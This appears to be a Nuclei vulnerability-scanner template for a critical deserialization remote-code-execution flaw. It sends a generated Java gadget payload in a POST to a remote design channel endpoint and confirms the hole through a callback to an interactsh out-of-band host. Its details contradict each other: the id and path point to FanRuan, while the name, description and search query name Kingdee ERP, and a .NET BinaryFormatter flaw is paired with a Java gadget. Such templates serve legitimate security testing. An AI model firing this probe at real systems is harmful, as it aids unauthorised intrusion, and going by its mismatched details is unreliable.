id: fanruan-deserialization

info:
  name: Kingdee ERP BinaryFormatterProxy Deserialization - Remote Code Execution
  author: Co5mos
  severity: critical
  description: Kingdee ERP has a deserialization vulnerability that can lead to Remote Code Execution (RCE).
  reference:
    - https://blog.csdn.net/qq_41904294/article/details/131332436
  metadata:
    max-request: 2
    verified: true
    fofa-query: app="金蝶云星空-管理中心"
  tags: kingdee,rce

http:
  - raw:
      - |
        POST /webroot/decision/remote/design/channel HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/octet-stream

        {{generate_java_gadget("dns", "http://{{interactsh-url}}", "gzip")}}

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - http
